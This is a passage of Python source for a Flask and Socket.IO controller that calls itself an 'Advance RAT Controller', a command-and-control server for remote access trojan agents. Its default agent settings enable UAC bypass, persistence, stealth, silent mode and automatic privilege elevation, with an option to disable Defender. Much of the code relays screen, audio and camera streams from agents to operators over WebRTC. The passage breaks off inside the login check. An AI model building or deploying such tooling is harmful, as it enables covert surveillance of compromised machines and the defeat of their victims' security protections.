#final controller
# Use standard threading (avoids eventlet/gevent requirements on Render)

from flask import Flask, request, jsonify, redirect, url_for, Response, send_file, send_from_directory, session, flash, render_template_string, render_template
from flask_socketio import SocketIO, emit, join_room, leave_room
from flask_cors import CORS
LIMITER_AVAILABLE = False
from collections import defaultdict
import datetime
import time
import os
import base64
import queue
import hashlib
import hmac
import secrets
import threading
import smtplib
from email.mime.text import MIMEText
import json
import re

# WebRTC imports for SFU functionality
try:
    import asyncio
    import aiortc
    from aiortc import RTCPeerConnection, RTCSessionDescription, MediaStreamTrack
    from aiortc.contrib.media import MediaPlayer, MediaRecorder
    from aiortc.mediastreams import MediaStreamError
    WEBRTC_AVAILABLE = True
    print("WebRTC (aiortc) support enabled")
except ImportError:
    WEBRTC_AVAILABLE = False
    print("WebRTC (aiortc) not available - falling back to Socket.IO streaming")

# Configuration Management
class Config:
    """Configuration class for Advance RAT Controller"""
    
    # Admin Authentication
    ADMIN_PASSWORD = os.environ.get('ADMIN_PASSWORD')
    if not ADMIN_PASSWORD:
        raise ValueError("ADMIN_PASSWORD environment variable is required. Please set a secure password.")
    
    # Validate password strength
    if len(ADMIN_PASSWORD) < 8:
        raise ValueError("ADMIN_PASSWORD must be at least 8 characters long.")
    if not any(c.isupper() for c in ADMIN_PASSWORD):
        print("Warning: ADMIN_PASSWORD should contain uppercase letters for better security.")
    if not any(c.isdigit() for c in ADMIN_PASSWORD):
        print("Warning: ADMIN_PASSWORD should contain digits for better security.")
    
    # Flask Configuration
    SECRET_KEY = os.environ.get('SECRET_KEY', None)
    
    # Server Configuration
    HOST = os.environ.get('HOST', '0.0.0.0')
    PORT = int(os.environ.get('PORT', 8080))
    
    # Security Settings
    SESSION_TIMEOUT = int(os.environ.get('SESSION_TIMEOUT', 3600))  # 1 hour in seconds
    MAX_LOGIN_ATTEMPTS = int(os.environ.get('MAX_LOGIN_ATTEMPTS', 5))
    LOGIN_TIMEOUT = int(os.environ.get('LOGIN_TIMEOUT', 300))  # 5 minutes lockout
    
    # Password Security Settings
    SALT_LENGTH = 32  # Length of salt in bytes
    HASH_ITERATIONS = 100000  # Number of iterations for PBKDF2

# Initialize Flask app with configuration
app = Flask(__name__)
app.config['SECRET_KEY'] = Config.SECRET_KEY or secrets.token_hex(32)  # Use config or generate secure random key

# Add security headers
@app.after_request
def add_security_headers(response):
    """Add security headers to all responses"""
    response.headers['X-Content-Type-Options'] = 'nosniff'
    response.headers['X-Frame-Options'] = 'DENY'
    response.headers['X-XSS-Protection'] = '1; mode=block'
    response.headers['Strict-Transport-Security'] = 'max-age=31536000; includeSubDomains'
    response.headers['Content-Security-Policy'] = "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; connect-src 'self' wss: ws:;"
    response.headers['Referrer-Policy'] = 'strict-origin-when-cross-origin'
    response.headers['Permissions-Policy'] = 'geolocation=(), microphone=(), camera=()'
    return response

# Defer CORS/socket initialization until after settings helpers are defined
socketio = None

# Optional rate limiting (disabled in this revision)

# -----------------------------
# Settings persistence (JSON)
# -----------------------------
SETTINGS_FILE_PATH = os.environ.get('SETTINGS_FILE_PATH', os.path.join(os.path.dirname(__file__), 'settings.json'))

DEFAULT_SETTINGS = {
    'server': {
        'controllerUrl': f"http://{Config.HOST}:{Config.PORT}",
        'serverPort': Config.PORT,
        'sslEnabled': False,
        'maxAgents': 100,
        'heartbeatInterval': 30,
        'commandTimeout': 30,
        'autoReconnect': True,
        'backupUrl': ''
    },
    'authentication': {
        # Do NOT persist plaintext in production; kept here for parity with UI. Prefer env ADMIN_PASSWORD.
        'operatorPassword': '',
        'sessionTimeout': 30,
        'maxLoginAttempts': 3,
        'requireTwoFactor': False,
        'apiKeyEnabled': True,
        'apiKey': ''
    },
    'email': {
        'enabled': False,
        'smtpServer': 'smtp.gmail.com',
        'smtpPort': 587,
        'username': '',
        'password': '',
        'recipient': '',
        'enableTLS': True,
        'notifyAgentOnline': True,
        'notifyAgentOffline': True,
        'notifyCommandFailure': True,
        'notifySecurityAlert': True
    },
    'agent': {
        'defaultPersistence': True,
        'enableUACBypass': True,
        'enableDefenderDisable': False,
        'enableAdvancedPersistence': True,
        'silentMode': True,
        'quickStartup': False,
        'enableStealth': True,
        'autoElevatePrivileges': True
    },
    'webrtc': {
        'enabled': True,
        'iceServers': [
            'stun:stun.l.google.com:19302',
            'stun:stun1.l.google.com:19302'
        ],
        'maxBitrate': 5000000,
        'adaptiveBitrate': True,
        'frameDropping': True,
        'qualityLevel': 'auto',
        'monitoringEnabled': True
    },
    'security': {
        'encryptCommunication': True,
        'validateCertificates': False,
        'allowSelfSigned': True,
        'rateLimitEnabled': True,
        'rateLimitRequests': 100,
        'rateLimitWindow': 60,
        # Allow configuring additional CORS origins from UI
        'frontendOrigins': []
    }
}

def _deep_update(original: dict, updates: dict) -> dict:
    for key, value in updates.items():
        if isinstance(value, dict) and isinstance(original.get(key), dict):
            _deep_update(original[key], value)
        else:
            original[key] = value
    return original

def load_settings() -> dict:
    try:
        if os.path.exists(SETTINGS_FILE_PATH):
            with open(SETTINGS_FILE_PATH, 'r') as f:
                data = json.load(f)
            # Merge with defaults to ensure missing keys are present
            merged = json.loads(json.dumps(DEFAULT_SETTINGS))
            return _deep_update(merged, data)
    except Exception as e:
        print(f"Failed to load settings.json: {e}")
    return json.loads(json.dumps(DEFAULT_SETTINGS))

def save_settings(data: dict) -> bool:
    try:
        with open(SETTINGS_FILE_PATH, 'w') as f:
            json.dump(data, f, indent=2)
        return True
    except Exception as e:
        print(f"Failed to save settings.json: {e}")
        return False

# Now that settings helpers exist, configure CORS and Socket.IO
allowed_origins = [
    "http://localhost:3000",
    "http://localhost:5173",
    "http://127.0.0.1:3000",
    "http://127.0.0.1:5173",
    "http://localhost:8080",
    "http://127.0.0.1:8080",
    "https://neural-control-hub-frontend.onrender.com",
    "https://agent-controller-backend.onrender.com",
]

try:
    _loaded = load_settings()
    for origin in _loaded.get('security', {}).get('frontendOrigins', []) or []:
        if isinstance(origin, str) and origin not in allowed_origins:
            allowed_origins.append(origin)
except Exception as _e:
    print(f"Warning loading dynamic CORS origins: {_e}")

# Add safe wildcard support for Render subdomains using regex (Flask-CORS supports regex)
render_wildcard_regex = r'^https://.*\.onrender\.com$'

CORS(
    app,
    origins=allowed_origins + [render_wildcard_regex],
    supports_credentials=True,
    allow_headers=["Content-Type", "Authorization", "X-Requested-With"]
)

# Initialize Socket.IO with expanded origin allowlist (include render.com wildcard)
render_origins = [
    "https://agent-controller-backend.onrender.com",
    "https://neural-control-hub-frontend.onrender.com"
]
# Add any render.com subdomain variations
for subdomain in ["www", "app", "dashboard", "frontend", "backend"]:
    render_origins.append(f"https://{subdomain}.onrender.com")
    render_origins.append(f"https://agent-controller-{subdomain}.onrender.com")
    render_origins.append(f"https://neural-control-hub-{subdomain}.onrender.com")

all_socketio_origins = allowed_origins + render_origins
ASYNC_MODE = 'threading'
try:
    import eventlet  # type: ignore
    ASYNC_MODE = 'eventlet'
except Exception:
    pass
socketio = SocketIO(
    app,
    async_mode=ASYNC_MODE,
    cors_allowed_origins=all_socketio_origins,
    ping_interval=25,
    ping_timeout=60,
    logger=False,
    engineio_logger=False
)
print(f"Socket.IO CORS origins: {all_socketio_origins}")

def send_email_notification(subject: str, body: str) -> bool:
    try:
        cfg = load_settings().get('email', {})
        if not cfg.get('enabled'):
            return False
        smtp_server = cfg.get('smtpServer')
        smtp_port = int(cfg.get('smtpPort') or 587)
        username = cfg.get('username')
        password = cfg.get('password')
        recipient = cfg.get('recipient')
        if not all([smtp_server, smtp_port, username, password, recipient]):
            print("Email settings incomplete; skipping notification")
            return False
        msg = MIMEText(body)
        msg['Subject'] = subject
        msg['From'] = username
        msg['To'] = recipient
        server = smtplib.SMTP(smtp_server, smtp_port, timeout=10)
        if cfg.get('enableTLS', True):
            server.starttls()
        server.login(username, password)
        server.sendmail(username, [recipient], msg.as_string())
        server.quit()
        return True
    except smtplib.SMTPAuthenticationError as e:
        print(f"SMTP authentication failed: {e}")
        return False
    except smtplib.SMTPConnectError as e:
        print(f"SMTP connection failed: {e}")
        return False
    except smtplib.SMTPException as e:
        print(f"SMTP error: {e}")
        return False
    except Exception as e:
        print(f"Unexpected email notification error: {e}")
        return False

# WebRTC Configuration
WEBRTC_CONFIG = {
    'enabled': WEBRTC_AVAILABLE,
    'ice_servers': [
        {'urls': 'stun:stun.l.google.com:19302'},
        {'urls': 'stun:stun1.l.google.com:19302'},
        {'urls': 'stun:stun2.l.google.com:19302'},
        {'urls': 'stun:stun3.l.google.com:19302'},
        {'urls': 'stun:stun4.l.google.com:19302'}
    ],
    'codecs': {
        'video': ['VP8', 'VP9', 'H.264'],
        'audio': ['Opus', 'PCM']
    },
    'simulcast': True,
    'svc': True,
    'bandwidth_estimation': True,
    'adaptive_bitrate': True,
    'frame_dropping': True,
    'quality_levels': {
        'low': {'width': 640, 'height': 480, 'fps': 15, 'bitrate': 500000},
        'medium': {'width': 1280, 'height': 720, 'fps': 30, 'bitrate': 2000000},
        'high': {'width': 1920, 'height': 1080, 'fps': 30, 'bitrate': 5000000},
        'auto': {'adaptive': True, 'min_bitrate': 500000, 'max_bitrate': 10000000}
    },
    'performance_tuning': {
        'keyframe_interval': 2,  # seconds
        'disable_b_frames': True,
        'ultra_low_latency': True,
        'hardware_acceleration': True,
        'gop_size': 60,  # frames at 30fps = 2 seconds
        'max_bitrate_variance': 0.3  # 30% variance allowed
    },
    'monitoring': {
        'connection_quality_metrics': True,
        'automatic_reconnection': True,
        'detailed_logging': True,
        'stats_interval': 1000,  # ms
        'quality_thresholds': {
            'min_bitrate': 100000,  # 100 kbps
            'max_latency': 1000,    # 1 second
            'min_fps': 15
        }
    }
}

# WebRTC Global State
WEBRTC_PEER_CONNECTIONS = {}  # agent_id -> RTCPeerConnection
WEBRTC_STREAMS = {}  # agent_id -> {screen, audio, camera} streams
WEBRTC_VIEWERS = {}  # viewer_id -> {agent_id, pc, streams}

# Production Scale Configuration
PRODUCTION_SCALE = {
    'current_implementation': 'aiortc_sfu',  # Current: aiortc-based SFU
    'target_implementation': 'mediasoup',    # Target: mediasoup for production scale
    'migration_phase': 'planning',           # Current phase: planning
    'scalability_limits': {
        'aiorttc_max_viewers': 50,           # aiortc suitable for smaller setups
        'mediasoup_max_viewers': 1000,       # mediasoup for production scale
        'concurrent_agents': 100,            # Maximum concurrent agents
        'bandwidth_per_agent': 10000000      # 10 Mbps per agent
    },
    'performance_targets': {
        'target_latency': 100,               # 100ms target latency
        'target_bitrate': 5000000,           # 5 Mbps target bitrate
        'target_fps': 30,                    # 30 FPS target
        'max_packet_loss': 0.01              # 1% max packet loss
    }
}

# Security Configuration and Password Management
def generate_salt():
    """Generate a cryptographically secure salt"""
    return secrets.token_bytes(Config.SALT_LENGTH)

def hash_password(password, salt=None):
    """
    Hash a password using PBKDF2 with SHA-256
    
    Args:
        password (str): The password to hash
        salt (bytes, optional): Salt to use. If None, generates a new salt
    
    Returns:
        tuple: (hashed_password, salt) where both are base64 encoded strings
    """
    if salt is None:
        salt = generate_salt()
    elif isinstance(salt, str):
        salt = base64.b64decode(salt)
    
    # Use PBKDF2 with SHA-256 for secure password hashing
    import hashlib
    import hmac
    
    # Create the hash using PBKDF2
    hash_obj = hashlib.pbkdf2_hmac(
        'sha256',
        password.encode('utf-8'),
        salt,
        Config.HASH_ITERATIONS
    )
    
    # Return base64 encoded hash and salt
    return base64.b64encode(hash_obj).decode('utf-8'), base64.b64encode(salt).decode('utf-8')

def verify_password(password, stored_hash, stored_salt):
    """
    Verify a password against a stored hash and salt
    
    Args:
        password (str): The password to verify
        stored_hash (str): The stored hash (base64 encoded)
        stored_salt (str): The stored salt (base64 encoded)
    
    Returns:
        bool: True if password matches, False otherwise
    """
    try:
        # Hash the provided password with the stored salt
        hash_obj, _ = hash_password(password, stored_salt)
        return hmac.compare_digest(hash_obj, stored_hash)
    except Exception as e:
        print(f"Password verification error: {e}")
        return False

def create_secure_password_hash(password):
    """
    Create a secure hash for a password
    
    Args:
        password (str): The password to hash
    
    Returns:
        tuple: (hash, salt) both base64 encoded
    """
    return hash_password(password)

# Generate secure hash for admin password (with error handling)
try:
    ADMIN_PASSWORD_HASH, ADMIN_PASSWORD_SALT = create_secure_password_hash(Config.ADMIN_PASSWORD)
except Exception as e:
    print(f"Error creating admin password hash: {e}")
    raise ValueError("Failed to create secure password hash. Please check your ADMIN_PASSWORD.")

# WebRTC Utility Functions
def create_webrtc_peer_connection(agent_id):
    """Create a WebRTC peer connection for an agent"""
    if not WEBRTC_AVAILABLE:
        return None
    
    try:
        pc = RTCPeerConnection()
        
        # Configure ICE servers
        for ice_server in WEBRTC_CONFIG['ice_servers']:
            pc.addIceServer(ice_server)
        
        # Store the peer connection
        WEBRTC_PEER_CONNECTIONS[agent_id] = pc
        
        # Set up event handlers
        @pc.on("connectionstatechange")
        async def on_connectionstatechange():
            print(f"WebRTC connection state for {agent_id}: {pc.connectionState}")
            if pc.connectionState == "failed":
                await pc.close()
                if agent_id in WEBRTC_PEER_CONNECTIONS:
                    del WEBRTC_PEER_CONNECTIONS[agent_id]
        
        @pc.on("iceconnectionstatechange")
        async def on_iceconnectionstatechange():
            print(f"ICE connection state for {agent_id}: {pc.iceConnectionState}")
        
        @pc.on("track")
        async def on_track(track):
            print(f"Received {track.kind} track from {agent_id}")
            if agent_id not in WEBRTC_STREAMS:
                WEBRTC_STREAMS[agent_id] = {}
            WEBRTC_STREAMS[agent_id][track.kind] = track
            
            # Forward track to all viewers of this agent
            for viewer_id, viewer_data in WEBRTC_VIEWERS.items():
                if viewer_data['agent_id'] == agent_id:
                    try:
                        sender = viewer_data['pc'].addTrack(track)
                        viewer_data['streams'][track.kind] = sender
                    except Exception as e:
                        print(f"Error forwarding track to viewer {viewer_id}: {e}")
        
        return pc
    except Exception as e:
        print(f"Error creating WebRTC peer connection for {agent_id}: {e}")
        return None

def close_webrtc_connection(agent_id):
    """Close WebRTC connection for an agent"""
    if agent_id in WEBRTC_PEER_CONNECTIONS:
        try:
            pc = WEBRTC_PEER_CONNECTIONS[agent_id]
            # Properly handle async context
            try:
                loop = asyncio.get_event_loop()
                if loop.is_running():
                    # If loop is running, schedule the coroutine
                    future = asyncio.run_coroutine_threadsafe(pc.close(), loop)
                    future.result(timeout=5)  # Wait up to 5 seconds
                else:
                    # If no loop or not running, use asyncio.run
                    asyncio.run(pc.close())
            except (RuntimeError, asyncio.TimeoutError) as e:
                print(f"Warning: Could not cleanly close WebRTC connection for {agent_id}: {e}")
                # Force cleanup even if close fails
                pass
            finally:
                del WEBRTC_PEER_CONNECTIONS[agent_id]
        except Exception as e:
            print(f"Error closing WebRTC connection for {agent_id}: {e}")
    
    if agent_id in WEBRTC_STREAMS:
        del WEBRTC_STREAMS[agent_id]

def get_webrtc_stats(agent_id):
    """Get WebRTC statistics for an agent"""
    if not WEBRTC_AVAILABLE or agent_id not in WEBRTC_PEER_CONNECTIONS:
        return None
    
    try:
        pc = WEBRTC_PEER_CONNECTIONS[agent_id]
        stats = {
            'connection_state': pc.connectionState,
            'ice_connection_state': pc.iceConnectionState,
            'ice_gathering_state': pc.iceGatheringState,
            'signaling_state': pc.signalingState,
            'local_description': pc.localDescription.sdp if pc.localDescription else None,
            'remote_description': pc.remoteDescription.sdp if pc.remoteDescription else None
        }
        return stats
    except Exception as e:
        print(f"Error getting WebRTC stats for {agent_id}: {e}")
        return None

# Advanced WebRTC Performance Optimization Functions
def estimate_bandwidth(agent_id):
    """Estimate available bandwidth for an agent connection"""
    if not WEBRTC_AVAILABLE or agent_id not in WEBRTC_PEER_CONNECTIONS:
        return None
    
    try:
        pc = WEBRTC_PEER_CONNECTIONS[agent_id]
        # Get RTCStatsReport for bandwidth estimation
        try:
            loop = asyncio.get_event_loop()
            future = asyncio.run_coroutine_threadsafe(pc.getStats(), loop)
            stats_report = future.result(timeout=5)  # 5 second timeout
        except RuntimeError:
            # No event loop, run synchronously
            stats_report = asyncio.run(pc.getStats())
        
        bandwidth_stats = {
            'available_bandwidth': 0,
            'current_bitrate': 0,
            'packets_lost': 0,
            'rtt': 0,
            'jitter': 0
        }
        
        for stat in stats_report.values():
            if hasattr(stat, 'type'):
                if stat.type == 'inbound-rtp' and stat.mediaType == 'video':
                    bandwidth_stats['current_bitrate'] = getattr(stat, 'bytesReceived', 0) * 8 / 1000  # kbps
                    bandwidth_stats['packets_lost'] = getattr(stat, 'packetsLost', 0)
                elif stat.type == 'candidate-pair' and stat.state == 'succeeded':
                    bandwidth_stats['rtt'] = getattr(stat, 'currentRoundTripTime', 0) * 1000  # ms
                    bandwidth_stats['jitter'] = getattr(stat, 'jitter', 0) * 1000  # ms
        
        # Estimate available bandwidth based on current performance
        if bandwidth_stats['packets_lost'] > 0:
            # Reduce bitrate if packet loss detected
            bandwidth_stats['available_bandwidth'] = max(
                bandwidth_stats['current_bitrate'] * 0.8,
                WEBRTC_CONFIG['quality_levels']['low']['bitrate']
            )
        else:
            # Increase bitrate if no packet loss
            bandwidth_stats['available_bandwidth'] = min(
                bandwidth_stats['current_bitrate'] * 1.2,
                WEBRTC_CONFIG['quality_levels']['high']['bitrate']
            )
        
        return bandwidth_stats
        
    except Exception as e:
        print(f"Error estimating bandwidth for {agent_id}: {e}")
        return None

def adaptive_bitrate_control(agent_id, current_quality='auto'):
    """Implement adaptive bitrate control based on network conditions"""
    if not WEBRTC_AVAILABLE or agent_id not in WEBRTC_PEER_CONNECTIONS:
        return None
    
    try:
        bandwidth_stats = estimate_bandwidth(agent_id)
        if not bandwidth_stats:
            return None
        
        # Determine optimal quality level based on bandwidth
        available_bandwidth = bandwidth_stats['available_bandwidth']
        current_bitrate = bandwidth_stats['current_bitrate']
        
        # Quality selection logic
        if available_bandwidth >= WEBRTC_CONFIG['quality_levels']['high']['bitrate']:
            optimal_quality = 'high'
        elif available_bandwidth >= WEBRTC_CONFIG['quality_levels']['medium']['bitrate']:
            optimal_quality = 'medium'
        else:
            optimal_quality = 'low'
        
        # Check if quality change is needed
        if current_quality != optimal_quality:
            print(f"Adaptive bitrate: Changing quality from {current_quality} to {optimal_quality}")
            print(f"Available bandwidth: {available_bandwidth:.0f} kbps, Current: {current_bitrate:.0f} kbps")
            
            # Emit quality change command to agent
            socketio.emit('webrtc_quality_change', {
                'agent_id': agent_id,
                'quality': optimal_quality,
                'bandwidth_stats': bandwidth_stats
            })
            
            return optimal_quality
        
        return current_quality
        
    except Exception as e:
        print(f"Error in adaptive bitrate control for {agent_id}: {e}")
        return None

def implement_frame_dropping(agent_id, load_threshold=0.8):
    """Implement intelligent frame dropping under high load"""
    if not WEBRTC_AVAILABLE or agent_id not in WEBRTC_PEER_CONNECTIONS:
        return False
    
    try:
        # Check if psutil is available first
        try:
            import psutil
        except ImportError:
            print("psutil not available for load monitoring")
            return False
            
        # Get current system load
        cpu_percent = psutil.cpu_percent(interval=1)
        memory_percent = psutil.virtual_memory().percent
        
        # Check if we're under high load
        if cpu_percent > (load_threshold * 100) or memory_percent > (load_threshold * 100):
            print(f"High load detected: CPU {cpu_percent:.1f}%, Memory {memory_percent:.1f}%")
            
            # Emit frame dropping command to agent
            socketio.emit('webrtc_frame_dropping', {
                'agent_id': agent_id,
                'enabled': True,
                'drop_ratio': 0.3,  # Drop 30% of frames
                'priority': 'keyframes_only'  # Keep keyframes, drop some intermediate frames
            })
            
            return True
        
        # Normal load - disable frame dropping
        socketio.emit('webrtc_frame_dropping', {
            'agent_id': agent_id,
            'enabled': False
        })
        
        return False
        
    except ImportError:
        print("psutil not available for load monitoring")
        return False
    except Exception as e:
        print(f"Error implementing frame dropping for {agent_id}: {e}")
        return False

def monitor_connection_quality(agent_id):
    """Monitor and log connection quality metrics"""
    if not WEBRTC_AVAILABLE or agent_id not in WEBRTC_PEER_CONNECTIONS:
        return None
    
    try:
        bandwidth_stats = estimate_bandwidth(agent_id)
        if not bandwidth_stats:
            return None
        
        # Quality assessment
        quality_score = 100
        quality_issues = []
        
        # Check bitrate
        if bandwidth_stats['current_bitrate'] < WEBRTC_CONFIG['monitoring']['quality_thresholds']['min_bitrate']:
            quality_score -= 30
            quality_issues.append('Low bitrate')
        
        # Check latency
        if bandwidth_stats['rtt'] > WEBRTC_CONFIG['monitoring']['quality_thresholds']['max_latency']:
            quality_score -= 25
            quality_issues.append('High latency')
        
        # Check packet loss
        if bandwidth_stats['packets_lost'] > 0:
            quality_score -= 20
            quality_issues.append('Packet loss detected')
        
        # Check jitter
        if bandwidth_stats['jitter'] > 50:  # 50ms threshold
            quality_score -= 15
            quality_issues.append('High jitter')
        
        # Log quality metrics
        if WEBRTC_CONFIG['monitoring']['detailed_logging']:
            print(f"Connection Quality for {agent_id}:")
            print(f"  Quality Score: {quality_score}/100")
            print(f"  Current Bitrate: {bandwidth_stats['current_bitrate']:.0f} kbps")
            print(f"  RTT: {bandwidth_stats['rtt']:.1f} ms")
            print(f"  Jitter: {bandwidth_stats['jitter']:.1f} ms")
            print(f"  Packets Lost: {bandwidth_stats['packets_lost']}")
            if quality_issues:
                print(f"  Issues: {', '.join(quality_issues)}")
        
        return {
            'quality_score': quality_score,
            'bandwidth_stats': bandwidth_stats,
            'quality_issues': quality_issues,
            'timestamp': datetime.datetime.now().isoformat()
        }
        
    except Exception as e:
        print(f"Error monitoring connection quality for {agent_id}: {e}")
        return None

def automatic_reconnection_logic(agent_id):
    """Implement automatic reconnection logic for failed connections"""
    if not WEBRTC_AVAILABLE:
        return False
    
    try:
        if agent_id in WEBRTC_PEER_CONNECTIONS:
            pc = WEBRTC_PEER_CONNECTIONS[agent_id]
            
            # Check connection state
            if pc.connectionState == 'failed' or pc.connectionState == 'disconnected':
                print(f"WebRTC connection failed for {agent_id}, attempting reconnection...")
                
                # Close failed connection
                try:
                    loop = asyncio.get_event_loop()
                    asyncio.run_coroutine_threadsafe(pc.close(), loop)
                except RuntimeError:
                    asyncio.run(pc.close())
                del WEBRTC_PEER_CONNECTIONS[agent_id]
                
                # Wait before reconnection attempt
                import time
                time.sleep(2)
                
                # Attempt reconnection
                new_pc = create_webrtc_peer_connection(agent_id)
                if new_pc:
                    print(f"Reconnection successful for {agent_id}")
                    return True
                else:
                    print(f"Reconnection failed for {agent_id}")
                    return False
        
        return True
        
    except Exception as e:
        print(f"Error in automatic reconnection for {agent_id}: {e}")
        return False

# Production Scale Monitoring and Migration Functions
def assess_production_readiness():
    """Assess current system's readiness for production scale"""
    try:
        current_agents = len(WEBRTC_PEER_CONNECTIONS)
        current_viewers = len(WEBRTC_VIEWERS)
        total_connections = current_agents + current_viewers
        
        readiness_report = {
            'current_implementation': PRODUCTION_SCALE['current_implementation'],
            'target_implementation': PRODUCTION_SCALE['target_implementation'],
            'migration_phase': PRODUCTION_SCALE['migration_phase'],
            'current_usage': {
                'agents': current_agents,
                'viewers': current_viewers,
                'total_connections': total_connections
            },
            'scalability_assessment': {
                'aiortc_limit_reached': current_viewers >= PRODUCTION_SCALE['scalability_limits']['aiorttc_max_viewers'],
                'production_ready': current_viewers < PRODUCTION_SCALE['scalability_limits']['aiorttc_max_viewers'],
                'recommended_action': 'migrate_to_mediasoup' if current_viewers >= PRODUCTION_SCALE['scalability_limits']['aiorttc_max_viewers'] else 'continue_with_aiortc'
            },
            'performance_metrics': {},
            'recommendations': []
        }
        
        # Performance assessment
        if current_agents > 0:
            total_latency = 0
            total_bitrate = 0
            total_fps = 0
            agent_count = 0
            
            for agent_id in WEBRTC_PEER_CONNECTIONS:
                quality_data = monitor_connection_quality(agent_id)
                if quality_data:
                    total_latency += quality_data['bandwidth_stats']['rtt']
                    total_bitrate += quality_data['bandwidth_stats']['current_bitrate']
                    agent_count += 1
            
            if agent_count > 0:
                readiness_report['performance_metrics'] = {
                    'average_latency': total_latency / agent_count,
                    'average_bitrate': total_bitrate / agent_count,
                    'latency_target_met': (total_latency / agent_count) <= PRODUCTION_SCALE['performance_targets']['target_latency'],
                    'bitrate_target_met': (total_bitrate / agent_count) >= PRODUCTION_SCALE['performance_targets']['target_bitrate']
                }
        
        # Generate recommendations
        if readiness_report['scalability_assessment']['aiortc_limit_reached']:
            readiness_report['recommendations'].append('Immediate migration to mediasoup required for production scale')
        elif current_viewers > (PRODUCTION_SCALE['scalability_limits']['aiorttc_max_viewers'] * 0.8):
            readiness_report['recommendations'].append('Approaching aiortc limits, plan mediasoup migration')
        
        if readiness_report['performance_metrics'].get('latency_target_met') == False:
            readiness_report['recommendations'].append('Optimize network configuration to meet latency targets')
        
        if readiness_report['performance_metrics'].get('bitrate_target_met') == False:
            readiness_report['recommendations'].append('Check bandwidth allocation and codec settings')
        
        return readiness_report
        
    except Exception as e:
        print(f"Error assessing production readiness: {e}")
        return None

def generate_mediasoup_migration_plan():
    """Generate detailed migration plan from aiortc to mediasoup"""
    try:
        migration_plan = {
            'current_state': {
                'implementation': 'aiortc_sfu',
                'max_viewers': PRODUCTION_SCALE['scalability_limits']['aiorttc_max_viewers'],
                'technology': 'Python + aiortc'
            },
            'target_state': {
                'implementation': 'mediasoup_sfu',
                'max_viewers': PRODUCTION_SCALE['scalability_limits']['mediasoup_max_viewers'],
                'technology': 'Node.js + mediasoup'
            },
            'migration_phases': [
                {
                    'phase': 1,
                    'name': 'Parallel Implementation',
                    'description': 'Implement mediasoup alongside existing aiortc',
                    'duration': '2-3 weeks',
                    'tasks': [
                        'Set up Node.js mediasoup server',
                        'Implement mediasoup SFU logic',
                        'Create migration endpoints',
                        'Test with subset of viewers'
                    ]
                },
                {
                    'phase': 2,
                    'name': 'Gradual Migration',
                    'description': 'Migrate viewers from aiortc to mediasoup',
                    'duration': '1-2 weeks',
                    'tasks': [
                        'Implement viewer routing logic',
                        'Add load balancing between aiortc and mediasoup',
                        'Monitor performance during migration',
                        'Handle fallback scenarios'
                    ]
                },
                {
                    'phase': 3,
                    'name': 'Full Migration',
                    'description': 'Complete migration to mediasoup',
                    'duration': '1 week',
                    'tasks': [
                        'Migrate all remaining viewers',
                        'Decommission aiortc implementation',
                        'Performance validation',
                        'Documentation updates'
                    ]
                }
            ],
            'technical_requirements': [
                'Node.js 18+ runtime',
                'mediasoup library installation',
                'Redis for session management',
                'Load balancer configuration',
                'Monitoring and alerting setup'
            ],
            'estimated_effort': '4-6 weeks',
            'risk_assessment': 'Medium - requires careful testing and rollback plan'
        }
        
        return migration_plan
        
    except Exception as e:
        print(f"Error generating mediasoup migration plan: {e}")
        return None

def enhanced_webrtc_monitoring():
    """Enhanced WebRTC monitoring with production-scale metrics"""
    try:
        monitoring_data = {
            'timestamp': datetime.datetime.now().isoformat(),
            'system_overview': {
                'total_agents': len(WEBRTC_PEER_CONNECTIONS),
                'total_viewers': len(WEBRTC_VIEWERS),
                'total_connections': len(WEBRTC_PEER_CONNECTIONS) + len(WEBRTC_VIEWERS),
                'system_load': {}
            },
            'performance_metrics': {},
            'quality_metrics': {},
            'scalability_metrics': {},
            'alerts': []
        }
        
        # System load monitoring
        try:
            import psutil
            monitoring_data['system_overview']['system_load'] = {
                'cpu_percent': psutil.cpu_percent(interval=1),
                'memory_percent': psutil.virtual_memory().percent,
                'network_io': psutil.net_io_counters()._asdict()
            }
        except ImportError:
            monitoring_data['system_overview']['system_load'] = {'error': 'psutil not available'}
        
        # Performance metrics per agent
        for agent_id in WEBRTC_PEER_CONNECTIONS:
            quality_data = monitor_connection_quality(agent_id)
            if quality_data:
                monitoring_data['performance_metrics'][agent_id] = quality_data
        
        # Quality assessment
        if monitoring_data['performance_metrics']:
            total_quality_score = sum(data['quality_score'] for data in monitoring_data['performance_metrics'].values())
            avg_quality_score = total_quality_score / len(monitoring_data['performance_metrics'])
            
            monitoring_data['quality_metrics'] = {
                'average_quality_score': avg_quality_score,
                'quality_distribution': {
                    'excellent': len([s for s in monitoring_data['performance_metrics'].values() if s['quality_score'] >= 90]),
                    'good': len([s for s in monitoring_data['performance_metrics'].values() if 70 <= s['quality_score'] < 90]),
                    'fair': len([s for s in monitoring_data['performance_metrics'].values() if 50 <= s['quality_score'] < 70]),
                    'poor': len([s for s in monitoring_data['performance_metrics'].values() if s['quality_score'] < 50])
                }
            }
        
        # Scalability assessment
        current_viewers = len(WEBRTC_VIEWERS)
        aiortc_limit = PRODUCTION_SCALE['scalability_limits']['aiorttc_max_viewers']
        
        monitoring_data['scalability_metrics'] = {
            'current_viewer_count': current_viewers,
            'aiortc_limit': aiortc_limit,
            'utilization_percentage': (current_viewers / aiortc_limit) * 100,
            'approaching_limit': current_viewers >= (aiortc_limit * 0.8),
            'limit_reached': current_viewers >= aiortc_limit
        }
        
        # Generate alerts
        if monitoring_data['scalability_metrics']['limit_reached']:
            monitoring_data['alerts'].append({
                'level': 'CRITICAL',
                'message': 'aiortc viewer limit reached - immediate migration required',
                'action': 'migrate_to_mediasoup'
            })
        elif monitoring_data['scalability_metrics']['approaching_limit']:
            monitoring_data['alerts'].append({
                'level': 'WARNING',
                'message': 'Approaching aiortc viewer limit - plan migration',
                'action': 'plan_migration'
            })
        
        # Quality alerts
        if monitoring_data['quality_metrics'].get('average_quality_score', 100) < 70:
            monitoring_data['alerts'].append({
                'level': 'WARNING',
                'message': 'Average connection quality below threshold',
                'action': 'investigate_network_issues'
            })
        
        return monitoring_data
        
    except Exception as e:
        print(f"Error in enhanced WebRTC monitoring: {e}")
        return None

# Session management and security tracking
LOGIN_ATTEMPTS = {}  # Track failed login attempts by IP

def is_authenticated():
    """Check if user is authenticated and session is valid"""
    print(f"Session check - authenticated: {session.get('authenticated', False)}")
    print(f"Session contents: {dict(session)}")
    
    if not session.get('authenticated', False):
        print("Not authenticated - returning False")
        return False
    
    # Check session timeout
    login_time = session.get('login_time')
